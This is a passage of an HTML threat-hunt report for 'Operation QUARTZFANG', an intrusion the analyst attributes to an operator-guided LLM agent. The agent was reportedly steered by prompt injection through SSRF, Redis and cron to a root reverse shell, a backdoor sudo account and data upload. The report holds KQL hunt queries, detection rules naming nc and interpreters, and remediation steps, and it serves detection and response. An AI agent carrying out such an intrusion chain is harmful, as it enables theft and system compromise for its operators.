+</tr>
+</tbody>
+</table></div>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceNetworkEvents_CL
+| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where DeviceName =~ &quot;sc-portal01&quot; and RemotePort == 443
+| summarize Connections = count(), First = min(Timestamp), Pids = make_set(InitiatingProcessId) by RemoteIP, InitiatingProcessFileName
+| order by Connections desc
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Alert on an outbound connection from a root process, or one whose parent is cron, to a first-time destination. Do not key on port 443, the IP, or the process name.</p></div></details>
+<h3>Section 6: Reconnaissance and Timing</h3>
+<details class="phase"><summary><span class="phase-title">Flag S6.1: Scanner IPs</span><span class="sum-tags">T1595.002</span><span class="badge badge-medium">Medium</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Sort the scans before the exploit into threat and scheduled.</p>
+<h3>Finding</h3>
+<p>External: <code>198.51.100.31</code>, <code>198.51.100.45</code>, <code>198.51.100.62</code>, each 30 requests, 15 distinct URLs and 16 errors with <code>python-requests/2.31.0</code>, in slots from 06:30:00 to 06:31:52. Internal: <code>10.5.0.250</code>, <code>Nessus/10.6.2</code>, 2 requests, 0 errors, at 06:31:48 and 06:46:49.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">PortalAccessLog_CL
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 06:52:30))
+| where Computer =~ &quot;sc-portal01&quot;
+| summarize Requests = count(), DistinctUrls = dcount(UrlOriginal), Errors = countif(HttpStatusCode &gt;= 400), First = min(TimeGenerated), Last = max(TimeGenerated), Agents = make_set(UserAgent, 3) by SrcIpAddr
+| order by Requests desc
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Alert on a source group with a high error ratio and a scripting-library user agent in a short window. Exclude the known scanner and its schedule.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S6.2: Recon vs Nessus discrimination</span><span class="sum-tags">T1595.002</span><span class="badge badge-medium">Medium</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Say what distinguishes the external recon from the scheduled scan.</p>
+<h3>Finding</h3>
+<p>Target selection (the recon asked for <code>/.env</code>, <code>/admin/</code>, <code>/api/v1/users</code>, <code>/api/v1/projects</code>, <code>/api/v1/docs</code>, <code>/api/v2/</code> and the preview endpoint; Nessus asked for <code>/api/v1/</code> and <code>/robots.txt</code>), response codes (8 of 15 recon paths failed; Nessus 0 errors), and cadence (30 requests in about 30 seconds per source against 2 requests 15 minutes apart).</p>
+<h3>Why It Matters</h3>
+<p>The only recon request that reached anything useful was <code>/api/v1/preview?url=test</code>, which returned 400 instead of 404. That revealed the endpoint and its <code>url</code> parameter about 20 minutes before the exploit.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">PortalAccessLog_CL
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 06:52:30))
+| where Computer =~ &quot;sc-portal01&quot;
+| where SrcIpAddr startswith &quot;198.51.100.&quot; or SrcIpAddr == &quot;10.5.0.250&quot;
+| summarize Requests = count() by SrcIpAddr, UrlOriginal, HttpStatusCode
+| order by SrcIpAddr asc, Requests desc
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Same as S6.1. Make the preview endpoint return one response for any bad input so a 400 does not confirm it exists.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S6.3: Timing signature</span><span class="sum-tags">T1588.007</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Test a colleague's claim that this looks like a normal human operation.</p>
+<h3>Finding</h3>
+<p>A human shows irregular gaps of minutes between commands, with pauses and mistakes. This chain shows machine-speed bursts (commands 2 to 10 seconds apart) separated by 13 to 57 minute idle gaps that line up with the operator's approvals. The shell's commands and gaps: <code>cat</code>, 6 s, <code>env</code>, 6 s, <code>find</code>, then 3,398 s idle; <code>tar</code>, 2 s, <code>gzip</code>, 6 s, <code>openssl</code>; then 767 s to <code>curl</code>; then 875 s to <code>useradd</code>, 10 s, <code>usermod</code>, 8 s, <code>mkdir</code>, 2 s, <code>ssh-keygen</code>.</p>
+<h3>Why It Matters</h3>
+<p>Fast bursts alone could be a script. The combination (adapting to a failure in 1.6 seconds, narrated reasoning, approvals in the idle gaps) places it as an agent guided by an operator.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where DeviceName =~ &quot;sc-portal01&quot; and InitiatingProcessId == 4401
+| summarize by Timestamp, FileName
+| sort by Timestamp asc
+| extend GapSeconds = datetime_diff('second', Timestamp, prev(Timestamp))
+| project Timestamp, FileName, GapSeconds
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Alert on several different system tools launched seconds apart under one interpreter parent after a long idle period.</p></div></details>
+<h3>Section 7: Autonomy Synthesis</h3>
+<details class="phase"><summary><span class="phase-title">Flag S7.1: Operator decision gates</span><span class="sum-tags">T1588.007</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Count the human decisions in the agent log.</p>
+<h3>Finding</h3>
+<p>5 operator directives: the initial tasking (06:31), the post-foothold approval (06:53), the post-lateral approval (07:31), the collection review and staging approval (07:48), and the pre-exfiltration approval (07:48, 0.4 seconds later). Four of them are phase-transition approvals.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">LLMAgentLogs_CL
+| where TimeGenerated between (datetime(2026-10-22 06:30:00) .. datetime(2026-10-24 23:59:59))
+| where HuntName == &quot;quartzfang&quot; and actor == &quot;quartzfang-agent&quot; and isnotempty(user_input)
+| project TimeGenerated, user_input
+| order by TimeGenerated asc
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Log operator directives and agent tool calls as a first-class audit trail.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S7.2: Autonomy placement</span><span class="sum-tags">T1588.007, T1699</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Place the operation on the spectrum from person to machine.</p>
+<h3>Finding</h3>
+<p>Operator-guided: a person who set a machine going. Human involvement: <code>LLMAgentLogs_CL.user_input</code> (5 directives). Machine speed: <code>DeviceProcessEvents_CL.Timestamp</code> and <code>ProcessCommandLine</code> (commands 2 to 10 seconds apart), <code>PortalAccessLog_CL.UrlOriginal</code> (an 18-second payload correction), <code>Syslog.SyslogMessage</code> on <code>sc-db01</code> (5 statements in 9 seconds). Not fully autonomous: <code>LLMAgentLogs_CL.model_response</code> against <code>Syslog.SyslogMessage</code> on <code>sc-admin01</code> (claimed secrets, got a 403).</p>
+<h3>Why It Matters</h3>
+<p>Counter-arguments: fast bursts could be a script, and the approvals might be automated. The log cannot rule either out; the combination is what places it.</p>
+<h3>Detection Recommendation</h3>
+<p>Treat agent tempo (bursts, then silence) as a behavioural signal in its own right.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S7.3: Novel ATT&CK technique</span><span class="sum-tags">T1588.007</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Name the technique that captures the AI as the execution engine.</p>
+<h3>Finding</h3>
+<p>T1588.007 Obtain Capabilities: Artificial Intelligence (Resource Development). The novelty is who executed the chain, not the techniques. SSRF to Redis to cron is an old pattern. T1699 Direct Prompt Injection is related but different: it is how the operators got the agent to comply.</p>
+<h3>Detection Recommendation</h3>
+<p>Detect the behaviours (tempo, lineage, first-time destinations), because the AI capability itself is acquired off the victim's network.</p></div></details>
+<h3>Section 8: Real or Noise</h3>
+<details class="phase"><summary><span class="phase-title">Flag S8.1: Credential reuse across services</span><span class="sum-tags">T1078</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Separate the attacker's use of <code>portal_svc</code> from the application's, across three hosts, without revoking it.</p>
+<h3>Finding</h3>
+<p>The source IP (<code>10.5.0.10</code>) is shared, so it cannot separate them. The originating process can: every connection from <code>sc-portal01</code> to the database, registry and admin API came from python3 PID 4401, the root reverse shell, not the application's gunicorn workers. On <code>sc-db01</code> the attacker's sessions also lacked <code>application_name</code>, and ran unparameterised bursts. On <code>sc-admin01</code> the attacker's calls came from <code>10.5.0.10</code>, while routine admin calls come from <code>10.5.0.100</code> and <code>.101</code>.</p>
+<h3>Evidence</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Connection</th>
+<th>Opened by</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sc-db01</td>
+<td><code>10.5.0.20:5432</code> at 07:16:11</td>
+<td>PID 4401</td>
+</tr>
+<tr>
+<td>sc-registry01</td>
+<td><code>10.5.0.30:443</code> at 07:33:01</td>
+<td>PID 4401</td>
+</tr>
+<tr>
+<td>sc-admin01</td>
+<td><code>10.5.0.40:8443</code> at 07:45:24</td>
+<td>PID 4401</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Why It Matters</h3>
+<p>Revoking <code>portal_svc</code> would take the application down and leave the shell, the cron entry and <code>svc_monitor</code> in place. Contain the process and the persistence first, then rotate <code>portal_svc</code> and <code>ci-builder</code> in a planned change. The network table shows only the attacker's connections to these hosts, so the comparison is attacker-side process against application-side label.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceNetworkEvents_CL
+| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| where RemoteIP in (&quot;10.5.0.20&quot;, &quot;10.5.0.30&quot;, &quot;10.5.0.40&quot;)
+| summarize Connections = count(), First = min(Timestamp), Pids = make_set(InitiatingProcessId) by RemoteIP, RemotePort, InitiatingProcessFileName
+| order by First asc
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Alert on a service account session that lacks its usual <code>application_name</code>, or on a process other than the application's workers opening the database connection.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S8.2: pg_dump disconfirmation (n/a)</span><span class="badge badge-medium">Medium</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Test whether the nightly <code>pg_dump</code> is part of the intrusion.</p>
+<h3>Finding</h3>
+<p>Normal scheduled activity. <code>pg_dump -U portal_svc -h localhost -Fc semicrest &gt; /backup/nightly/semicrest.dump</code> ran on 18, 19 and 20 Sep with the same OS account (<code>backup</code>), the same parent (<code>bash</code>) and one distinct command line. The 20 Sep first run was 02:59:49, 3.5 hours before the first attack event. <code>portal_svc</code> in the command is the database role, not the OS user.</p>
+<h3>Evidence</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Day</th>
+<th style="text-align: right;">Rows</th>
+<th>First (UTC)</th>
+<th>Account</th>
+<th>Parent</th>
+<th style="text-align: right;">Distinct commands</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>18 Sep</td>
+<td style="text-align: right;">29</td>
+<td>07:30:35</td>
+<td>backup</td>
+<td>bash</td>
+<td style="text-align: right;">1</td>
+</tr>
+<tr>
+<td>19 Sep</td>
+<td style="text-align: right;">33</td>
+<td>02:59:52</td>
+<td>backup</td>
+<td>bash</td>
+<td style="text-align: right;">1</td>
+</tr>
+<tr>
+<td>20 Sep</td>
+<td style="text-align: right;">19</td>
+<td>02:59:49</td>
+<td>backup</td>
+<td>bash</td>
+<td style="text-align: right;">1</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Why It Matters</h3>
+<p>Same tool and same database login as the attacker, but a different source, parent and history. The schedule shows more runs per day than "nightly at 03:00", and I did not check whether the dump file was read during the attack.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-15 00:00:00) .. datetime(2026-09-21 00:00:00))
+| where DeviceName =~ &quot;sc-db01&quot; and FileName =~ &quot;pg_dump&quot;
+| summarize Runs = count(), First = min(Timestamp), Accounts = make_set(AccountName), Parents = make_set(InitiatingProcessFileName), Commands = dcount(ProcessCommandLine) by Day = bin(Timestamp, 1d)
+| order by Day asc
+</code></pre></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S8.3: Connection spike dead end (n/a)</span><span class="badge badge-medium">Medium</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Decide whether the 07:30 connection spike on <code>sc-db01</code> is enumeration.</p>
+<h3>Finding</h3>
+<p>Noise: connection pool exhaustion. The spike is 213 <code>FATAL: remaining connection slots are reserved for roles with the SUPERUSER attribute</code> and 193 <code>FATAL: sorry, too many clients already</code>, with no <code>SELECT *</code> and no catalogue reads. In the 07:30 slot there were 159 and 152 FATAL errors against only 22 successful statements, fewer than the slots before it (36 to 49). The FATAL lines carry no client address, so I cannot say which client used up the connections.</p>
+<h3>Why It Matters</h3>
+<p>Volume tells you something happened, content tells you what.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">Syslog
+| where TimeGenerated between (datetime(2026-09-20 07:28:00) .. datetime(2026-09-20 07:50:00))
+| where Computer =~ &quot;sc-db01&quot; and ProcessName =~ &quot;postgres&quot;
+| summarize Count = count(), First = min(TimeGenerated) by SyslogMessage
+| order by Count desc
+</code></pre></div></details></section><section id="detection-gaps-telemetry-gaps"><div class="section-header"><span class="section-num">12</span><h2 class="section-title">Detection Gaps &amp; Telemetry Gaps</h2></div><h3>Observed Detection Gaps</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Gap</th>
+<th>Impact</th>
+<th>Recommended Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Only the web requests alerted. Nothing fired on cron starting a Python shell as root</td>
+<td>High</td>
+<td>DR-01</td>
+</tr>
+<tr>
+<td>No alert on a service account reading whole tables and system catalogues</td>
+<td>High</td>
+<td>DR-02, plus session labelling the rule can join on</td>
+</tr>
+<tr>
+<td>No alert on a backdoor account created and added to sudo by a shell</td>
+<td>High</td>
+<td>DR-03</td>
+</tr>
+<tr>
+<td>Outbound 443 from a root process to a first-time destination did not alert</td>
+<td>High</td>
+<td>Process-based egress rule (see S5.4)</td>
+</tr>
+<tr>
+<td>A refused secrets request (403) from an unusual source did not alert</td>
+<td>Medium</td>
+<td>Alert on 403 to sensitive endpoints from new sources</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Telemetry Gaps (questions the data cannot answer)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Table / source checked</th>
+<th>Why it cannot be answered</th>
+<th>Log change needed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Did Redis write the crontab file, and where?</td>
+<td><code>Syslog</code> (no Redis process logged), <code>DeviceFileEvents_CL</code> (no rows 06:52:40 to 06:53:40)</td>
+<td>Redis does not forward logs, and the cron file write was not captured</td>
+<td>Forward Redis logs, monitor writes to cron directories</td>
+</tr>
+<tr>
+<td>What did <code>env</code> return at 07:05:21?</td>
+<td><code>DeviceProcessEvents_CL</code>, <code>LLMAgentLogs_CL</code></td>
+<td>Command output is never recorded and the agent logged no <code>env</code> call</td>
+<td>Audit <code>/proc/*/environ</code> reads, session recording</td>
+</tr>
+<tr>
+<td>What was in the archive, and did the upload complete?</td>
+<td><code>DeviceFileEvents_CL</code>, <code>DeviceNetworkEvents_CL</code></td>
+<td>No file contents, no byte counts, no response from the destination</td>
+<td>Proxy or packet logs with byte counts</td>
+</tr>
+<tr>
+<td>What did <code>inspect_layer</code> return?</td>
+<td><code>ContainerRegistryLog_CL</code></td>
+<td>The log records the operation and resource, not the response</td>
+<td>Registry audit with response size</td>
+</tr>
+<tr>
+<td>Which client exhausted the database connections at 07:30?</td>
+<td><code>Syslog</code> (postgres)</td>
+<td><code>FATAL</code> lines carry no client address</td>
+<td>Log connection attempts with the source</td>
+</tr>
+<tr>
+<td>Which statement belonged to which database session?</td>
+<td><code>Syslog</code> joined on <code>ProcessID</code></td>
+<td><code>ProcessID</code> did not separate sessions in this data</td>
+<td>Add session ID and <code>application_name</code> to statement logs</td>
+</tr>
+<tr>
+<td>Was <code>svc_monitor</code> ever used?</td>
+<td><code>DeviceLogonEvents_CL</code> not reviewed in this hunt</td>
+<td>Not checked</td>
+<td>Review logons for the account</td>
+</tr>
+</tbody>
+</table></div></section><section id="detection-rules-built"><div class="section-header"><span class="section-num">13</span><h2 class="section-title">Detection Rules Built</h2></div><div class="expand-bar"><button type="button" class="exp" data-open="1">Expand all</button><button type="button" class="exp" data-open="0">Collapse all</button></div><p>Validation used the attack window (2026-09-20 06:30 to 08:30) and the lead-in baseline (2026-09-15 to 2026-09-20 06:30). Hits are de-duplicated (each event is logged twice in this data).</p>
+<p>Rule files, Sentinel analytics rule YAML and the backtest queries are in the hunt folder under <a href="https://github.com/CharlieMathe/Threat-Hunting/tree/main/Operation_QUARTZFANG/detections">detections/</a>.</p>
+<h3>Rule Summary</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Rule ID</th>
+<th>Name</th>
+<th>ATT&amp;CK</th>
+<th>Pyramid Tier</th>
+<th>Severity</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DR-01</td>
+<td>Interpreter or shell started by cron on the portal</td>
+<td>T1053.003, T1059.006</td>
+<td>TTP</td>
+<td>High</td>
+<td>Tested</td>
+</tr>
+<tr>
+<td>DR-02</td>
+<td>Database enumeration statements</td>
+<td>T1213.006</td>
+<td>TTP</td>
+<td>High</td>
+<td>Draft (baseline hits unresolved)</td>
+</tr>
+<tr>
+<td>DR-03</td>
+<td>Account created or added to sudo by an interpreter</td>
+<td>T1136.001, T1098</td>
+<td>TTP</td>
+<td>High</td>
+<td>Tested</td>
+</tr>
+</tbody>
+</table></div>
+<details class="phase"><summary><span class="phase-title">DR-01: Interpreter or shell started by cron on the portal</span></summary><div class="phase-body">
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Purpose</div><div class="kv-val">Catch a shell that cron starts from a file someone else wrote</div></div><div class="kv-item"><div class="kv-key">ATT&amp;CK</div><div class="kv-val">T1053.003, T1059.006</div></div><div class="kv-item"><div class="kv-key">Data source</div><div class="kv-val"><code>DeviceProcessEvents_CL</code>: <code>InitiatingProcessFileName</code>, <code>FileName</code>, <code>ProcessCommandLine</code></div></div><div class="kv-item"><div class="kv-key">Linked flag(s)</div><div class="kv-val">S1.4</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Why this discriminator</div><div class="kv-val">The exploit, payload and IP can change. Cron launching an interpreter on a web server is the behaviour that stays</div></div></div>
+<p><strong>Logic (plain English):</strong> IF the parent is <code>cron</code> AND the child is python, perl, sh, bash or nc on <code>sc-portal01</code> THEN alert.</p>
+<p><strong>KQL:</strong></p>
+<pre><code class="language-kql">// Scheduled form
+DeviceProcessEvents_CL
+| where Timestamp &gt; ago(1h)
+| where DeviceName =~ &quot;sc-portal01&quot;
+| where InitiatingProcessFileName =~ &quot;cron&quot; and FileName in~ (&quot;python3&quot;, &quot;python&quot;, &quot;perl&quot;, &quot;sh&quot;, &quot;bash&quot;, &quot;nc&quot;)
+| project Timestamp, DeviceName, AccountName, FileName, ProcessId, ProcessCommandLine
+</code></pre>
+<pre><code class="language-kql">// Validation query as run
+DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-15 00:00:00) .. datetime(2026-09-21 00:00:00))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| where InitiatingProcessFileName =~ &quot;cron&quot; and FileName in~ (&quot;python3&quot;, &quot;python&quot;, &quot;perl&quot;, &quot;sh&quot;, &quot;bash&quot;, &quot;nc&quot;)
+| extend Period = case(Timestamp &lt; datetime(2026-09-20 06:30:00), &quot;baseline&quot;, Timestamp &lt;= datetime(2026-09-20 08:30:00), &quot;attack window&quot;, &quot;after&quot;)
+| summarize Hits = dcount(Timestamp), First = min(Timestamp) by Period
+</code></pre>
+<p><strong>Validation (real results only):</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Test</th>
+<th>Data used</th>
+<th>Time range</th>
+<th style="text-align: right;">Hits</th>
+<th style="text-align: right;">True positives</th>
+<th style="text-align: right;">False positives</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attack replay</td>
+<td>Hunt data</td>
+<td>2026-09-20 06:30 to 08:30</td>
+<td style="text-align: right;">1</td>
+<td style="text-align: right;">1</td>
+<td style="text-align: right;">0</td>
+<td>The reverse shell at 06:52:52</td>
+</tr>
+<tr>
+<td>Baseline noise</td>
+<td>Lead-in, 1,219 process events</td>
+<td>2026-09-15 to 2026-09-20 06:30</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">0</td>
+<td>Routine cron jobs run their own binaries, not an interpreter</td>
+</tr>
+<tr>
+<td>After the window</td>
+<td>359 process events</td>
+<td>2026-09-20 08:30 to 2026-09-21</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">0</td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Tuning decisions:</strong> none needed in this data.
+<strong>Blind spots:</strong> many real estates run every cron job through <code>/bin/sh -c</code>, which would flood this rule; there it needs a command-line filter (for example <code>-c</code> with <code>socket</code> or <code>connect</code>). A systemd timer or a compiled binary would not match.
+<strong>Next iteration:</strong> add the command-line filter and test it on an estate where cron uses <code>sh -c</code>. Not tested here.</p>
+</div></details><details class="phase"><summary><span class="phase-title">DR-02: Database enumeration statements</span></summary><div class="phase-body">
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Purpose</div><div class="kv-val">Catch whole-table reads and system catalogue reads on the production database</div></div><div class="kv-item"><div class="kv-key">ATT&amp;CK</div><div class="kv-val">T1213.006</div></div><div class="kv-item"><div class="kv-key">Data source</div><div class="kv-val"><code>Syslog</code> on <code>sc-db01</code>, <code>ProcessName</code> = <code>postgres</code>, <code>SyslogMessage</code></div></div><div class="kv-item"><div class="kv-key">Linked flag(s)</div><div class="kv-val">S3.1, S3.2</div></div><div class="kv-item"><div class="kv-key">Why this discriminator</div><div class="kv-val">The account and IP were shared with the application. Statement shape was not</div></div></div>
+<p><strong>Logic (plain English):</strong> IF a statement reads <code>information_schema</code>, <code>pg_catalog</code>, <code>pg_shadow</code> or <code>password_hash</code>, OR is a bare <code>SELECT * FROM table</code> THEN alert.</p>
+<p><strong>KQL:</strong></p>
+<pre><code class="language-kql">// Validation query as run
+Syslog
+| where TimeGenerated between (datetime(2026-09-15 00:00:00) .. datetime(2026-09-21 00:00:00))
+| where Computer =~ &quot;sc-db01&quot; and ProcessName =~ &quot;postgres&quot;
+| where SyslogMessage startswith &quot;statement:&quot;
+| where SyslogMessage has_any (&quot;information_schema&quot;, &quot;pg_catalog&quot;, &quot;pg_shadow&quot;, &quot;password_hash&quot;) or SyslogMessage matches regex @&quot;(?i)statement:\s*SELECT \* FROM \w+\s*$&quot;
+| extend Period = case(TimeGenerated &lt; datetime(2026-09-20 06:30:00), &quot;baseline&quot;, TimeGenerated &lt;= datetime(2026-09-20 08:30:00), &quot;attack window&quot;, &quot;after&quot;)
+| summarize Hits = dcount(TimeGenerated), First = min(TimeGenerated), Stmts = dcount(SyslogMessage) by Period
+</code></pre>
+<p><strong>Validation (real results only):</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Test</th>
+<th>Data used</th>
+<th>Time range</th>
+<th style="text-align: right;">Hits</th>
+<th style="text-align: right;">True positives</th>
+<th style="text-align: right;">False positives</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attack replay</td>
+<td>Hunt data</td>
+<td>2026-09-20 06:30 to 08:30</td>
+<td style="text-align: right;">6</td>
+<td style="text-align: right;">6</td>
+<td style="text-align: right;">0</td>
+<td>6 distinct statements: the 07:16 burst plus the <code>password_hash</code> read at 07:45</td>
+</tr>
+<tr>
+<td>Baseline noise</td>
+<td>Lead-in</td>
+<td>2026-09-15 to 2026-09-20 06:30</td>
+<td style="text-align: right;">4</td>
+<td style="text-align: right;">Unresolved</td>
+<td style="text-align: right;">Unresolved</td>
+<td>The same 6 statements at 2026-09-19 23:12:32 and 23:13:56</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>The unresolved baseline burst:</strong> the connection at 23:12:32 on 19 Sep was <code>user=portal_svc ... application_name=portal_svc host=10.5.0.10</code>, which is the application's label. It could be a scheduled report, an admin task, a test artefact in the lead-in data, or earlier attacker activity. Nothing in the hunt proves which, so it is neither counted as a true positive nor dismissed.</p>
+<p><strong>Tuning decisions:</strong> I tried to require a missing <code>application_name</code> by joining statements to their connection line on <code>ProcessID</code>. It failed: both labelled and unlabelled connections joined to the same statements, so <code>ProcessID</code> does not identify a session in this data.
+<strong>Blind spots:</strong> the targeted 07:45 statements with explicit columns (projects and customers) did not match. An attacker who names columns and avoids catalogues passes.
+<strong>Next iteration:</strong> get session IDs into the statement log, then add the <code>application_name</code> condition and a burst threshold (4 or more matches in 60 seconds).</p>
+</div></details><details class="phase"><summary><span class="phase-title">DR-03: Account created or added to sudo by an interpreter</span></summary><div class="phase-body">
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Purpose</div><div class="kv-val">Catch backdoor accounts made from a shell rather than by an administrator</div></div><div class="kv-item"><div class="kv-key">ATT&amp;CK</div><div class="kv-val">T1136.001, T1098</div></div><div class="kv-item"><div class="kv-key">Data source</div><div class="kv-val"><code>DeviceProcessEvents_CL</code>: <code>FileName</code>, <code>InitiatingProcessFileName</code></div></div><div class="kv-item"><div class="kv-key">Linked flag(s)</div><div class="kv-val">S5.3</div></div><div class="kv-item"><div class="kv-key">Why this discriminator</div><div class="kv-val">The account name will change. The parent of <code>useradd</code> is much harder to change</div></div></div>
+<p><strong>Logic (plain English):</strong> IF <code>useradd</code>, <code>adduser</code> or <code>usermod</code> runs with a parent of python, perl, sh or cron THEN alert.</p>
+<p><strong>KQL:</strong></p>
+<pre><code class="language-kql">// Scheduled form
+DeviceProcessEvents_CL
+| where Timestamp &gt; ago(1h)
+| where FileName in~ (&quot;useradd&quot;, &quot;adduser&quot;, &quot;usermod&quot;)
+| where InitiatingProcessFileName in~ (&quot;python3&quot;, &quot;python&quot;, &quot;perl&quot;, &quot;sh&quot;, &quot;cron&quot;)
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
+</code></pre>
+<p><strong>Validation (real results only):</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Test</th>
+<th>Data used</th>
+<th>Time range</th>
+<th style="text-align: right;">Hits</th>
+<th style="text-align: right;">True positives</th>
+<th style="text-align: right;">False positives</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attack replay</td>
+<td>Hunt data</td>
+<td>2026-09-20 06:30 to 08:30</td>
+<td style="text-align: right;">2</td>
+<td style="text-align: right;">2</td>
+<td style="text-align: right;">0</td>
+<td><code>useradd</code> and <code>usermod -aG sudo</code> for <code>svc_monitor</code></td>
+</tr>
+<tr>
+<td>Baseline noise</td>
+<td>Lead-in, 1,219 process events</td>
+<td>2026-09-15 to 2026-09-20 06:30</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">0</td>
+<td>No account tools ran in the baseline</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Tuning decisions:</strong> none needed in this data.
+<strong>Blind spots:</strong> editing <code>/etc/passwd</code> directly, or creating the account from a parent not in the list.
+<strong>Next iteration:</strong> add file events on <code>/etc/passwd</code>, <code>/etc/sudoers</code> and <code>authorized_keys</code>.</p></div></details></section><section id="remediation-containment-checklist"><div class="section-header"><span class="section-num">14</span><h2 class="section-title">Remediation &amp; Containment Checklist</h2></div><div class="expand-bar"><button type="button" class="exp" data-open="1">Expand all</button><button type="button" class="exp" data-open="0">Collapse all</button></div><details class="phase"><summary><span class="phase-title">Immediate Actions (0 to 4 hours)</span></summary><div class="phase-body">
+<ul>
+<li class="task">Isolate <code>sc-portal01</code> from the network</li>
+<li class="task">Kill the reverse shell (python3 PID 4401) and remove the cron entry that started it</li>
+<li class="task">Delete <code>svc_monitor</code>, remove <code>/home/svc_monitor/.ssh</code> and check every <code>authorized_keys</code> file</li>
+<li class="task">Block <code>203.0.113.87</code>, <code>198.51.100.210</code> and <code>198.51.100.31</code>, <code>.45</code>, <code>.62</code> at the firewall</li>
+<li class="task">Preserve forensic images before changing anything</li>
+<li class="task">Notify legal and compliance: customer contact details and password hashes were read</li>
+</ul>
+</div></details><details class="phase"><summary><span class="phase-title">Short Term (4 to 24 hours)</span></summary><div class="phase-body">
+<ul>
+<li class="task">Rotate <code>portal_svc</code> and <code>ci-builder</code> in a planned change with the application and CI owners (revoking without a plan takes the portal down)</li>
+<li class="task">Treat secrets in the portal's environment as exposed and rotate them</li>
+<li class="task">Force password resets for portal users whose hashes were read, and review PostgreSQL role passwords (<code>pg_shadow</code>)</li>
+<li class="task">Remove <code>/tmp/.portal-cache/</code></li>
+<li class="task">Fix the preview feature: allow only <code>https://</code> to approved domains, block internal addresses</li>
+<li class="task">Lock down Redis: bind to localhost with a password, disable <code>CONFIG</code>, run as a non-root user</li>
+<li class="task">Confirm the <code>db_admin</code> credential claimed by the agent does not exist</li>
+</ul>
+</div></details><details class="phase"><summary><span class="phase-title">Medium Term (1 to 7 days)</span></summary><div class="phase-body">
+<ul>
+<li class="task">Rebuild <code>sc-portal01</code> from a clean image (the attacker had root)</li>
+<li class="task">Move secrets from <code>portal.conf</code> into a secrets store</li>
+<li class="task">Give each service its own narrow account</li>
+<li class="task">Deploy and tune DR-01 to DR-03</li>
+<li class="task">Forward Redis logs and monitor writes to cron directories</li>
+</ul>
